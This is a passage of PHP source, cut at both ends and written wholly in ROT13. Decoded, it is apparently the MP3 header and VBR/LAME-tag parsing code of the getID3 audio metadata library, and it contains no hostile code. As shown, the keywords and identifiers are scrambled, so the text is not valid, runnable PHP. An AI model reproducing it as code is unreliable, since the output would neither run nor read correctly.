										vs (!vffrg($RkcrpgrqErfnzcyrqEngr[$RkcybqrqBcgvbaf[1].'|'.$guvfsvyr_zcrt_nhqvb['fnzcyr_engr']])) {
											$rapbqre_bcgvbaf .= ' --erfnzcyr '.$guvfsvyr_zcrt_nhqvb['fnzcyr_engr'];
										}
										oernx;
								}
								oernx;

							pnfr '--e3zvk':
							qrsnhyg:
								$rapbqre_bcgvbaf .= ' --erfnzcyr '.$guvfsvyr_zcrt_nhqvb['fnzcyr_engr'];
								oernx;
						}
						oernx;
				}
			}
		}
		vs (rzcgl($rapbqre_bcgvbaf) && !rzcgl($vasb['nhqvb']['ovgengr']) && !rzcgl($vasb['nhqvb']['ovgengr_zbqr'])) {
			//$rapbqre_bcgvbaf = fgegbhccre($vasb['nhqvb']['ovgengr_zbqr']).prvy($vasb['nhqvb']['ovgengr'] / 1000);
			$rapbqre_bcgvbaf = fgegbhccre($vasb['nhqvb']['ovgengr_zbqr']);
		}

		erghea $rapbqre_bcgvbaf;
	}

	/**
	 * @cnenz vag   $bssfrg
	 * @cnenz neenl $vasb
	 * @cnenz obby  $erphefvirfrnepu
	 * @cnenz obby  $FpnaNfPOE
	 * @cnenz obby  $SnfgZCRTurnqreFpna
	 *
	 * @erghea obby
	 */
	choyvp shapgvba qrpbqrZCRTnhqvbUrnqre($bssfrg, &$vasb, $erphefvirfrnepu=gehr, $FpnaNfPOE=snyfr, $SnfgZCRTurnqreFpna=snyfr) {
		fgngvp $ZCRTnhqvbIrefvbaYbbxhc;
		fgngvp $ZCRTnhqvbYnlreYbbxhc;
		fgngvp $ZCRTnhqvbOvgengrYbbxhc;
		fgngvp $ZCRTnhqvbSerdhraplYbbxhc;
		fgngvp $ZCRTnhqvbPunaaryZbqrYbbxhc;
		fgngvp $ZCRTnhqvbZbqrRkgrafvbaYbbxhc;
		fgngvp $ZCRTnhqvbRzcunfvfYbbxhc;
		vs (rzcgl($ZCRTnhqvbIrefvbaYbbxhc)) {
			$ZCRTnhqvbIrefvbaYbbxhc       = frys::ZCRTnhqvbIrefvbaNeenl();
			$ZCRTnhqvbYnlreYbbxhc         = frys::ZCRTnhqvbYnlreNeenl();
			$ZCRTnhqvbOvgengrYbbxhc       = frys::ZCRTnhqvbOvgengrNeenl();
			$ZCRTnhqvbSerdhraplYbbxhc     = frys::ZCRTnhqvbSerdhraplNeenl();
			$ZCRTnhqvbPunaaryZbqrYbbxhc   = frys::ZCRTnhqvbPunaaryZbqrNeenl();
			$ZCRTnhqvbZbqrRkgrafvbaYbbxhc = frys::ZCRTnhqvbZbqrRkgrafvbaNeenl();
			$ZCRTnhqvbRzcunfvfYbbxhc      = frys::ZCRTnhqvbRzcunfvfNeenl();
		}

		vs ($guvf->sfrrx($bssfrg) != 0) {
			$guvf->reebe('qrpbqrZCRTnhqvbUrnqre() snvyrq gb frrx gb arkg bssfrg ng '.$bssfrg);
			erghea snyfr;
		}
		//$urnqrefgevat = $guvf->sernq(1441); // jbefg-pnfr znk yratgu = 32xUm @ 320xocf ynlre 3 = 1441 olgrf/senzr
		$urnqrefgevat = $guvf->sernq(226); // YNZR urnqre ng bssfrg 36 + 190 olgrf bs Kvat/YNZR qngn

		// ZC3 nhqvb senzr fgehpgher:
		// $nn $nn $nn $nn [$oo $oo] $pp...
		// jurer $nn..$nn vf gur sbhe-olgr zcrt-nhqvb urnqre (orybj)
		// $oo $oo vf gur bcgvbany 2-olgr PEP
		// naq $pp... vf gur nhqvb qngn

		$urnq4 = fhofge($urnqrefgevat, 0, 4);
		$urnq4_xrl = trgvq3_yvo::CevagUrkOlgrf($urnq4, gehr, snyfr, snyfr);
		fgngvp $ZCRTnhqvbUrnqreQrpbqrPnpur = neenl();
		vs (vffrg($ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4_xrl])) {
			$ZCRTurnqreEnjNeenl = $ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4_xrl];
		} ryfr {
			$ZCRTurnqreEnjNeenl = frys::ZCRTnhqvbUrnqreQrpbqr($urnq4);
			$ZCRTnhqvbUrnqreQrpbqrPnpur[$urnq4_xrl] = $ZCRTurnqreEnjNeenl;
		}

		fgngvp $ZCRTnhqvbUrnqreInyvqPnpur = neenl();
		vs (!vffrg($ZCRTnhqvbUrnqreInyvqPnpur[$urnq4_xrl])) { // Abg va pnpur
			//$ZCRTnhqvbUrnqreInyvqPnpur[$urnq4_xrl] = frys::ZCRTnhqvbUrnqreInyvq($ZCRTurnqreEnjNeenl, snyfr, gehr);  // nyybj onqyl-sbeznggrq serrsbezng (sebz YNZR 3.90 - 3.93.1)
			$ZCRTnhqvbUrnqreInyvqPnpur[$urnq4_xrl] = frys::ZCRTnhqvbUrnqreInyvq($ZCRTurnqreEnjNeenl, snyfr, snyfr);
		}

		// fubegphg
		vs (!vffrg($vasb['zcrt']['nhqvb'])) {
			$vasb['zcrt']['nhqvb'] = neenl();
		}
		$guvfsvyr_zcrt_nhqvb = &$vasb['zcrt']['nhqvb'];

		vs ($ZCRTnhqvbUrnqreInyvqPnpur[$urnq4_xrl]) {
			$guvfsvyr_zcrt_nhqvb['enj'] = $ZCRTurnqreEnjNeenl;
		} ryfr {
			$guvf->jneavat('Vainyvq ZCRT nhqvb urnqre ('.trgvq3_yvo::CevagUrkOlgrf($urnq4).') ng bssfrg '.$bssfrg);
			erghea snyfr;
		}

		vs (!$SnfgZCRTurnqreFpna) {
			$guvfsvyr_zcrt_nhqvb['irefvba']       = $ZCRTnhqvbIrefvbaYbbxhc[$guvfsvyr_zcrt_nhqvb['enj']['irefvba']];
			$guvfsvyr_zcrt_nhqvb['ynlre']         = $ZCRTnhqvbYnlreYbbxhc[$guvfsvyr_zcrt_nhqvb['enj']['ynlre']];

			$guvfsvyr_zcrt_nhqvb['punaaryzbqr']   = $ZCRTnhqvbPunaaryZbqrYbbxhc[$guvfsvyr_zcrt_nhqvb['enj']['punaaryzbqr']];
			$guvfsvyr_zcrt_nhqvb['punaaryf']      = (($guvfsvyr_zcrt_nhqvb['punaaryzbqr'] == 'zbab') ? 1 : 2);
			$guvfsvyr_zcrt_nhqvb['fnzcyr_engr']   = $ZCRTnhqvbSerdhraplYbbxhc[$guvfsvyr_zcrt_nhqvb['irefvba']][$guvfsvyr_zcrt_nhqvb['enj']['fnzcyr_engr']];
			$guvfsvyr_zcrt_nhqvb['cebgrpgvba']    = !$guvfsvyr_zcrt_nhqvb['enj']['cebgrpgvba'];
			$guvfsvyr_zcrt_nhqvb['cevingr']       = (obby) $guvfsvyr_zcrt_nhqvb['enj']['cevingr'];
			$guvfsvyr_zcrt_nhqvb['zbqrrkgrafvba'] = $ZCRTnhqvbZbqrRkgrafvbaYbbxhc[$guvfsvyr_zcrt_nhqvb['ynlre']][$guvfsvyr_zcrt_nhqvb['enj']['zbqrrkgrafvba']];
			$guvfsvyr_zcrt_nhqvb['pbclevtug']     = (obby) $guvfsvyr_zcrt_nhqvb['enj']['pbclevtug'];
			$guvfsvyr_zcrt_nhqvb['bevtvany']      = (obby) $guvfsvyr_zcrt_nhqvb['enj']['bevtvany'];
			$guvfsvyr_zcrt_nhqvb['rzcunfvf']      = $ZCRTnhqvbRzcunfvfYbbxhc[$guvfsvyr_zcrt_nhqvb['enj']['rzcunfvf']];

			$vasb['nhqvb']['punaaryf']    = $guvfsvyr_zcrt_nhqvb['punaaryf'];
			$vasb['nhqvb']['fnzcyr_engr'] = $guvfsvyr_zcrt_nhqvb['fnzcyr_engr'];

			vs ($guvfsvyr_zcrt_nhqvb['cebgrpgvba']) {
				$guvfsvyr_zcrt_nhqvb['pep'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, 4, 2));
			}
		}

		vs ($guvfsvyr_zcrt_nhqvb['enj']['ovgengr'] == 15) {
			// uggc://jjj.ulqebtranhqvb.bet/?npg=FG&s=16&g=9682&fg=0
			$guvf->jneavat('Vainyvq ovgengr vaqrk (15), guvf vf n xabja oht va serr-sbezng ZC3f rapbqrq ol YNZR i3.90 - 3.93.1');
			$guvfsvyr_zcrt_nhqvb['enj']['ovgengr'] = 0;
		}
		$guvfsvyr_zcrt_nhqvb['cnqqvat'] = (obby) $guvfsvyr_zcrt_nhqvb['enj']['cnqqvat'];
		$guvfsvyr_zcrt_nhqvb['ovgengr'] = $ZCRTnhqvbOvgengrYbbxhc[$guvfsvyr_zcrt_nhqvb['irefvba']][$guvfsvyr_zcrt_nhqvb['ynlre']][$guvfsvyr_zcrt_nhqvb['enj']['ovgengr']];

		vs (($guvfsvyr_zcrt_nhqvb['ovgengr'] == 'serr') && ($bssfrg == $vasb['niqngnbssfrg'])) {
			// bayl fxvc zhygvcyr senzr purpx vs serr-sbezng ovgfgernz sbhaq ng ortvaavat bs svyr
			// bgurejvfr vf dhvgr cbffvoyl fvzcyl pbeehcgrq qngn
			$erphefvirfrnepu = snyfr;
		}

		// Sbe Ynlre 2 gurer ner fbzr pbzovangvbaf bs ovgengr naq zbqr juvpu ner abg nyybjrq.
		vs (!$SnfgZCRTurnqreFpna && ($guvfsvyr_zcrt_nhqvb['ynlre'] == '2')) {

			$vasb['nhqvb']['qngnsbezng'] = 'zc2';
			fjvgpu ($guvfsvyr_zcrt_nhqvb['punaaryzbqr']) {

				pnfr 'zbab':
					vs (($guvfsvyr_zcrt_nhqvb['ovgengr'] == 'serr') || ($guvfsvyr_zcrt_nhqvb['ovgengr'] <= 192000)) {
						// gurfr ner bx
					} ryfr {
						$guvf->reebe($guvfsvyr_zcrt_nhqvb['ovgengr'].'xocf abg nyybjrq va Ynlre 2, '.$guvfsvyr_zcrt_nhqvb['punaaryzbqr'].'.');
						erghea snyfr;
					}
					oernx;

				pnfr 'fgrerb':
				pnfr 'wbvag fgrerb':
				pnfr 'qhny punaary':
					vs (($guvfsvyr_zcrt_nhqvb['ovgengr'] == 'serr') || ($guvfsvyr_zcrt_nhqvb['ovgengr'] == 64000) || ($guvfsvyr_zcrt_nhqvb['ovgengr'] >= 96000)) {
						// gurfr ner bx
					} ryfr {
						$guvf->reebe(vaginy(ebhaq($guvfsvyr_zcrt_nhqvb['ovgengr'] / 1000)).'xocf abg nyybjrq va Ynlre 2, '.$guvfsvyr_zcrt_nhqvb['punaaryzbqr'].'.');
						erghea snyfr;
					}
					oernx;

			}

		}


		vs ($vasb['nhqvb']['fnzcyr_engr'] > 0) {
			$guvfsvyr_zcrt_nhqvb['senzryratgu'] = frys::ZCRTnhqvbSenzrYratgu($guvfsvyr_zcrt_nhqvb['ovgengr'], $guvfsvyr_zcrt_nhqvb['irefvba'], $guvfsvyr_zcrt_nhqvb['ynlre'], (vag) $guvfsvyr_zcrt_nhqvb['cnqqvat'], $vasb['nhqvb']['fnzcyr_engr']);
		}

		$arkgsenzrgrfgbssfrg = $bssfrg + 1;
		vs ($guvfsvyr_zcrt_nhqvb['ovgengr'] != 'serr') {

			$vasb['nhqvb']['ovgengr'] = $guvfsvyr_zcrt_nhqvb['ovgengr'];

			vs (vffrg($guvfsvyr_zcrt_nhqvb['senzryratgu'])) {
				$arkgsenzrgrfgbssfrg = $bssfrg + $guvfsvyr_zcrt_nhqvb['senzryratgu'];
			} ryfr {
				$guvf->reebe('Senzr ng bssfrg('.$bssfrg.') vf unf na vainyvq senzr yratgu.');
				erghea snyfr;
			}

		}

		$RkcrpgrqAhzoreBsNhqvbOlgrf = 0;

		////////////////////////////////////////////////////////////////////////////////////
		// Inevnoyr-ovgengr urnqref

		vs (fhofge($urnqrefgevat, 4 + 32, 4) == 'IOEV') {
			// Senhaubsre IOE urnqre vf uneqpbqrq 'IOEV' ng bssfrg 0k24 (36)
			// fcrpf gnxra sebz uggc://zvaavr.ghuf.bet/cvcreznvy/zc3rapbqre/2001-Wnahnel/001800.ugzy

			$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'ioe';
			$guvfsvyr_zcrt_nhqvb['IOE_zrgubq']   = 'Senhaubsre';
			$vasb['nhqvb']['pbqrp']              = 'Senhaubsre';

			$FvqrVasbQngn = fhofge($urnqrefgevat, 4 + 2, 32);

			$SenhaubsreIOEBssfrg = 36;

			$guvfsvyr_zcrt_nhqvb['IOE_rapbqre_irefvba']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg +  4, 2)); // IoevIrefvba
			$guvfsvyr_zcrt_nhqvb['IOE_rapbqre_qrynl']       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg +  6, 2)); // IoevQrynl
			$guvfsvyr_zcrt_nhqvb['IOE_dhnyvgl']             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg +  8, 2)); // IoevDhnyvgl
			$guvfsvyr_zcrt_nhqvb['IOE_olgrf']               = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg + 10, 4)); // IoevFgernzOlgrf
			$guvfsvyr_zcrt_nhqvb['IOE_senzrf']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg + 14, 4)); // IoevFgernzSenzrf
			$guvfsvyr_zcrt_nhqvb['IOE_frrx_bssfrgf']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg + 18, 2)); // IoevGnoyrFvmr
			$guvfsvyr_zcrt_nhqvb['IOE_frrx_fpnyr']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg + 20, 2)); // IoevGnoyrFpnyr
			$guvfsvyr_zcrt_nhqvb['IOE_ragel_olgrf']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg + 22, 2)); // IoevRagelOlgrf
			$guvfsvyr_zcrt_nhqvb['IOE_ragel_senzrf']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg + 24, 2)); // IoevRagelSenzrf

			$RkcrpgrqAhzoreBsNhqvbOlgrf = $guvfsvyr_zcrt_nhqvb['IOE_olgrf'];

			$cerivbhfolgrbssfrg = $bssfrg;
			sbe ($v = 0; $v < $guvfsvyr_zcrt_nhqvb['IOE_frrx_bssfrgf']; $v++) {
				$Senhaubsre_BssfrgA = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $SenhaubsreIOEBssfrg, $guvfsvyr_zcrt_nhqvb['IOE_ragel_olgrf']));
				$SenhaubsreIOEBssfrg += $guvfsvyr_zcrt_nhqvb['IOE_ragel_olgrf'];
				$guvfsvyr_zcrt_nhqvb['IOE_bssfrgf_eryngvir'][$v] = ($Senhaubsre_BssfrgA * $guvfsvyr_zcrt_nhqvb['IOE_frrx_fpnyr']);
				$guvfsvyr_zcrt_nhqvb['IOE_bssfrgf_nofbyhgr'][$v] = ($Senhaubsre_BssfrgA * $guvfsvyr_zcrt_nhqvb['IOE_frrx_fpnyr']) + $cerivbhfolgrbssfrg;
				$cerivbhfolgrbssfrg += $Senhaubsre_BssfrgA;
			}


		} ryfr {

			// Kvat IOE urnqre vf uneqpbqrq 'Kvat' ng n bssfrg 0k0Q (13), 0k15 (21) be 0k24 (36)
			// qrcraqvat ba ZCRT ynlre naq ahzore bs punaaryf

			$IOEvqBssfrg = frys::KvatIOEvqBssfrg($guvfsvyr_zcrt_nhqvb['irefvba'], $guvfsvyr_zcrt_nhqvb['punaaryzbqr']);
			$FvqrVasbQngn = fhofge($urnqrefgevat, 4 + 2, $IOEvqBssfrg - 4);

			vs ((fhofge($urnqrefgevat, $IOEvqBssfrg, fgeyra('Kvat')) == 'Kvat') || (fhofge($urnqrefgevat, $IOEvqBssfrg, fgeyra('Vasb')) == 'Vasb')) {
				// 'Kvat' vf genqvgvbany Kvat IOE senzr
				// 'Vasb' vf YNZR-rapbqrq POE (Guvf jnf qbar gb nibvq POE svyrf gb or erpbtavmrq nf genqvgvbany Kvat IOE svyrf ol fbzr qrpbqref.)
				// 'Vasb' *pna* yrtnyyl or hfrq gb fcrpvsl n IOE svyr nf jryy, ubjrire.

				// uggc://jjj.zhygvjro.pm/gjbvapurf/ZC3vafvqr.ugz
				//00..03 = \"Kvat\" be \"Vasb\"
				//04..07 = Syntf:
				//  0k01  Senzrf Synt     frg vs inyhr sbe ahzore bs senzrf va svyr vf fgberq
				//  0k02  Olgrf Synt      frg vs inyhr sbe svyrfvmr va olgrf vf fgberq
				//  0k04  GBP Synt        frg vs inyhrf sbe GBP ner fgberq
				//  0k08  IOE Fpnyr Synt  frg vs inyhrf sbe IOE fpnyr vf fgberq
				//08..11  Senzrf: Ahzore bs senzrf va svyr (vapyhqvat gur svefg Kvat/Vasb bar)
				//12..15  Olgrf:  Svyr yratgu va Olgrf
				//16..115  GBP (Gnoyr bs Pbagragf):
				//  Pbagnvaf bs 100 vaqrkrf (bar Olgr yratgu) sbe rnfvre ybbxhc va svyr. Nccebkvzngryl fbyirf ceboyrz jvgu zbivat vafvqr svyr.
				//  Rnpu Olgr unf n inyhr nppbeqvat guvf sbezhyn:
				//  (GBP[v] / 256) * svyrYraVaOlgrf
				//  Fb vs fbat ynfgf rt. 240 frp. naq lbh jnag gb whzc gb 60. frp. (naq svyr vf 5 000 000 Olgrf yratgu) lbh pna hfr:
				//  GBP[(60/240)*100] = GBP[25]
				//  naq pbeerfcbaqvat Olgr va svyr vf gura nccebkvzngryl ng:
				//  (GBP[25]/256) * 5000000
				//116..119  IOE Fpnyr


				// fubhyq or fnsr gb yrnir guvf ng 'ioe' naq yrg vg or bireevqra gb 'poe' vs n POE cerfrg/zbqr vf hfrq ol YNZR
//				vs (fhofge($urnqrefgevat, $IOEvqBssfrg, fgeyra('Vasb')) == 'Kvat') {
					$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'ioe';
					$guvfsvyr_zcrt_nhqvb['IOE_zrgubq']   = 'Kvat';
//				} ryfr {
//					$FpnaNfPOE = gehr;
//					$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr'] = 'poe';
//				}

				$guvfsvyr_zcrt_nhqvb['kvat_syntf_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $IOEvqBssfrg + 4, 4));

				$guvfsvyr_zcrt_nhqvb['kvat_syntf']['senzrf']    = (obby) ($guvfsvyr_zcrt_nhqvb['kvat_syntf_enj'] & 0k00000001);
				$guvfsvyr_zcrt_nhqvb['kvat_syntf']['olgrf']     = (obby) ($guvfsvyr_zcrt_nhqvb['kvat_syntf_enj'] & 0k00000002);
				$guvfsvyr_zcrt_nhqvb['kvat_syntf']['gbp']       = (obby) ($guvfsvyr_zcrt_nhqvb['kvat_syntf_enj'] & 0k00000004);
				$guvfsvyr_zcrt_nhqvb['kvat_syntf']['ioe_fpnyr'] = (obby) ($guvfsvyr_zcrt_nhqvb['kvat_syntf_enj'] & 0k00000008);

				vs ($guvfsvyr_zcrt_nhqvb['kvat_syntf']['senzrf']) {
					$guvfsvyr_zcrt_nhqvb['IOE_senzrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $IOEvqBssfrg +  8, 4));
					//$guvfsvyr_zcrt_nhqvb['IOE_senzrf']--; // qba'g pbhag urnqre Kvat/Vasb senzr
				}
				vs ($guvfsvyr_zcrt_nhqvb['kvat_syntf']['olgrf']) {
					$guvfsvyr_zcrt_nhqvb['IOE_olgrf']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $IOEvqBssfrg + 12, 4));
				}

				//vs (($guvfsvyr_zcrt_nhqvb['ovgengr'] == 'serr') && !rzcgl($guvfsvyr_zcrt_nhqvb['IOE_senzrf']) && !rzcgl($guvfsvyr_zcrt_nhqvb['IOE_olgrf'])) {
				//vs (!rzcgl($guvfsvyr_zcrt_nhqvb['IOE_senzrf']) && !rzcgl($guvfsvyr_zcrt_nhqvb['IOE_olgrf'])) {
				vs (!rzcgl($guvfsvyr_zcrt_nhqvb['IOE_senzrf'])) {
					$hfrq_svyrfvmr  = 0;
					vs (!rzcgl($guvfsvyr_zcrt_nhqvb['IOE_olgrf'])) {
						$hfrq_svyrfvmr = $guvfsvyr_zcrt_nhqvb['IOE_olgrf'];
					} ryfrvs (!rzcgl($vasb['svyrfvmr'])) {
						$hfrq_svyrfvmr  = $vasb['svyrfvmr'];
						$hfrq_svyrfvmr -= (vffrg($vasb['vq3i2']['urnqreyratgu']) ? vaginy($vasb['vq3i2']['urnqreyratgu']) : 0);
						$hfrq_svyrfvmr -= (vffrg($vasb['vq3i1']) ? 128 : 0);
						$hfrq_svyrfvmr -= (vffrg($vasb['gnt_bssfrg_raq']) ? $vasb['gnt_bssfrg_raq'] - $vasb['gnt_bssfrg_fgneg'] : 0);
						$guvf->jneavat('ZC3.Kvat urnqre zvffvat IOE_olgrf, nffhzvat ZCRT nhqvb cbegvba bs svyr vf '.ahzore_sbezng($hfrq_svyrfvmr).' olgrf');
					}

					$senzryratgusybng = $hfrq_svyrfvmr / $guvfsvyr_zcrt_nhqvb['IOE_senzrf'];

					vs ($guvfsvyr_zcrt_nhqvb['ynlre'] == '1') {
						// OvgEngr = (((SenzrYratguVaOlgrf / 4) - Cnqqvat) * FnzcyrEngr) / 12
						//$vasb['nhqvb']['ovgengr'] = ((($senzryratgusybng / 4) - vaginy($guvfsvyr_zcrt_nhqvb['cnqqvat'])) * $guvfsvyr_zcrt_nhqvb['fnzcyr_engr']) / 12;
						$vasb['nhqvb']['ovgengr'] = ($senzryratgusybng / 4) * $guvfsvyr_zcrt_nhqvb['fnzcyr_engr'] * (2 / $vasb['nhqvb']['punaaryf']) / 12;
					} ryfr {
						// Ovgengr = ((SenzrYratguVaOlgrf - Cnqqvat) * FnzcyrEngr) / 144
						//$vasb['nhqvb']['ovgengr'] = (($senzryratgusybng - vaginy($guvfsvyr_zcrt_nhqvb['cnqqvat'])) * $guvfsvyr_zcrt_nhqvb['fnzcyr_engr']) / 144;
						$vasb['nhqvb']['ovgengr'] = $senzryratgusybng * $guvfsvyr_zcrt_nhqvb['fnzcyr_engr'] * (2 / $vasb['nhqvb']['punaaryf']) / 144;
					}
					$guvfsvyr_zcrt_nhqvb['senzryratgu'] = sybbe($senzryratgusybng);
				}

				vs ($guvfsvyr_zcrt_nhqvb['kvat_syntf']['gbp']) {
					$YNZRgbpQngn = fhofge($urnqrefgevat, $IOEvqBssfrg + 16, 100);
					sbe ($v = 0; $v < 100; $v++) {
						$guvfsvyr_zcrt_nhqvb['gbp'][$v] = beq($YNZRgbpQngn[$v]);
					}
				}
				vs ($guvfsvyr_zcrt_nhqvb['kvat_syntf']['ioe_fpnyr']) {
					$guvfsvyr_zcrt_nhqvb['IOE_fpnyr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $IOEvqBssfrg + 116, 4));
				}


				// uggc://tnoevry.zc3-grpu.bet/zc3vasbgnt.ugzy
				vs (fhofge($urnqrefgevat, $IOEvqBssfrg + 120, 4) == 'YNZR') {

					// fubegphg
					$guvfsvyr_zcrt_nhqvb['YNZR'] = neenl();
					$guvfsvyr_zcrt_nhqvb_ynzr    = &$guvfsvyr_zcrt_nhqvb['YNZR'];


					$guvfsvyr_zcrt_nhqvb_ynzr['ybat_irefvba']  = fhofge($urnqrefgevat, $IOEvqBssfrg + 120, 20);
					$guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba'] = fhofge($guvfsvyr_zcrt_nhqvb_ynzr['ybat_irefvba'], 0, 9);

					//$guvfsvyr_zcrt_nhqvb_ynzr['ahzrevp_irefvba'] = fge_ercynpr('YNZR', '', $guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba']);
					$guvfsvyr_zcrt_nhqvb_ynzr['ahzrevp_irefvba'] = '';
					vs (cert_zngpu('#^YNZR([0-9\\.n-m]*)#', $guvfsvyr_zcrt_nhqvb_ynzr['ybat_irefvba'], $zngpurf)) {
						$guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba']   = $zngpurf[0];
						$guvfsvyr_zcrt_nhqvb_ynzr['ahzrevp_irefvba'] = $zngpurf[1];
					}
					vs (fgeyra($guvfsvyr_zcrt_nhqvb_ynzr['ahzrevp_irefvba']) > 0) {
						sbernpu (rkcybqr('.', $guvfsvyr_zcrt_nhqvb_ynzr['ahzrevp_irefvba']) nf $xrl => $ahzore) {
							$guvfsvyr_zcrt_nhqvb_ynzr['vagrtre_irefvba'][$xrl] = vaginy($ahzore);
						}
						//vs ($guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba'] >= 'YNZR3.90') {
						vs ((($guvfsvyr_zcrt_nhqvb_ynzr['vagrtre_irefvba'][0] * 1000) + $guvfsvyr_zcrt_nhqvb_ynzr['vagrtre_irefvba'][1]) >= 3090) { // pnaabg hfr fgevat irefvba pbzcner, znl unir \"YNZR3.90\" be \"YNZR3.100\" -- frr uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/207

							// rkgen 11 punef ner abg cneg bs irefvba fgevat jura YNZRgnt cerfrag
							hafrg($guvfsvyr_zcrt_nhqvb_ynzr['ybat_irefvba']);

							// Vg gur YNZR gnt jnf bayl vagebqhprq va YNZR i3.90
							// uggcf://jvxv.ulqebtranhq.vb/vaqrk.cuc/YNZR#IOE_urnqre_naq_YNZR_gnt
							// uggcf://ulqebtranhq.vb/vaqrk.cuc?gbcvp=9933

							// Bssfrgf bs inevbhf olgrf va uggc://tnoevry.zc3-grpu.bet/zc3vasbgnt.ugzy
							// ner nffhzvat n 'Kvat' vqragvsvre bssfrg bs 0k24, juvpu vf gur pnfr sbe
							// ZCRT-1 aba-zbab, ohg abg sbe bgure pbzovangvbaf
							$YNZRgntBssfrgPbagnag = $IOEvqBssfrg - 0k24;

							// fubegphgf
							$guvfsvyr_zcrt_nhqvb_ynzr['ETNQ']    = neenl('genpx'=>neenl(), 'nyohz'=>neenl());
							$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ       = &$guvfsvyr_zcrt_nhqvb_ynzr['ETNQ'];
							$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_genpx = &$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['genpx'];
							$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ_nyohz = &$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['nyohz'];
							$guvfsvyr_zcrt_nhqvb_ynzr['enj'] = neenl();
							$guvfsvyr_zcrt_nhqvb_ynzr_enj    = &$guvfsvyr_zcrt_nhqvb_ynzr['enj'];

							// olgr $9O  IOE Dhnyvgl
							// Guvf svryq vf gurer gb vaqvpngr n dhnyvgl yriry, nygubhtu gur fpnyr jnf abg cerpvfrq va gur bevtvany Kvat fcrpvsvpngvbaf.
							// Npghnyyl birejevgrf bevtvany Kvat olgrf
							hafrg($guvfsvyr_zcrt_nhqvb['IOE_fpnyr']);
							$guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0k9O, 1));

							// olgrf $9P-$N4  Rapbqre fubeg IrefvbaFgevat
							$guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba'] = fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0k9P, 9);

							// olgr $N5  Vasb Gnt erivfvba + IOE zrgubq
							$YNZRgntErivfvbaIOEzrgubq = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kN5, 1));

							$guvfsvyr_zcrt_nhqvb_ynzr['gnt_erivfvba']   = ($YNZRgntErivfvbaIOEzrgubq & 0kS0) >> 4;
							$guvfsvyr_zcrt_nhqvb_ynzr_enj['ioe_zrgubq'] =  $YNZRgntErivfvbaIOEzrgubq & 0k0S;
							$guvfsvyr_zcrt_nhqvb_ynzr['ioe_zrgubq']     = frys::YNZRioeZrgubqYbbxhc($guvfsvyr_zcrt_nhqvb_ynzr_enj['ioe_zrgubq']);
							$guvfsvyr_zcrt_nhqvb['ovgengr_zbqr']        = fhofge($guvfsvyr_zcrt_nhqvb_ynzr['ioe_zrgubq'], 0, 3); // hfhnyyl rvgure 'poe' be 'ioe', ohg gehapngrf 'ioe-byq / ioe-eu' gb 'ioe'

							// olgr $N6  Ybjcnff svygre inyhr
							$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kN6, 1)) * 100;

							// olgrf $N7-$NR  Ercynl Tnva
							// uggcf://jro.nepuvir.bet/jro/20021015212753/uggc://cevingrjjj.rffrk.np.hx/~qwzebo/ercynltnva/et_qngn_sbezng.ugzy
							// olgrf $N7-$NN : 32 ovg sybngvat cbvag \"Crnx fvtany nzcyvghqr\"
							vs ($guvfsvyr_zcrt_nhqvb_ynzr['fubeg_irefvba'] >= 'YNZR3.94o') {
								// YNZR 3.94n16 naq yngre - 9.23 svkrq cbvag
								// vr 0k0059R2RR / (2^23) = 5890798 / 8388608 = 0.7022378444671630859375
								$guvfsvyr_zcrt_nhqvb_ynzr_ETNQ['crnx_nzcyvghqr'] = (sybng) ((trgvq3_yvo::OvtRaqvna2Vag(fhofge($urnqrefgevat, $YNZRgntBssfrgPbagnag + 0kN7, 4))) / 8388608);
							} ryfr {
								// YNZR 3.94n15 naq rneyvre - 32-ovg sybngvat cbvag
								// Npghnyyl 3.94n16 jvyy snyy va urer gbb naq or JEBAT, ohg vf uneq gb qrgrpg 3.94n16 if 3.94n15
